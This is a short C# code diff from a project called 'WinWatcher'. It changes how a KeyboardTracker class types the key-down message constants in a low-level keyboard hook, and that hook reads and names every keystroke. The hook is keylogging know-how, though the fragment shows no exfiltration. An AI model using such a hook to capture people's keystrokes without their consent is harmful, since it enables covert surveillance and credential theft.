@@ -10,8 +10,8 @@ namespace WinWatcher.Entities
         private string logPath;
         private IntPtr hookId = IntPtr.Zero;
         private Action<string> onKeyPressed;
-        private const int WM_KEYDOWN = 0x0100;
-        private const int WM_SYSKEYDOWN = 0x0104;
+        private const IntPtr WM_KEYDOWN = 0x0100;
+        private const IntPtr WM_SYSKEYDOWN = 0x0104;
         public KeyboardTracker(string path, Action<string> keyCallback)
         {
             logPath = path;
@@ -43,7 +43,7 @@ namespace WinWatcher.Entities
         private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 &&
-                (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
+                (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 string key = ((Keys)vkCode).ToString();
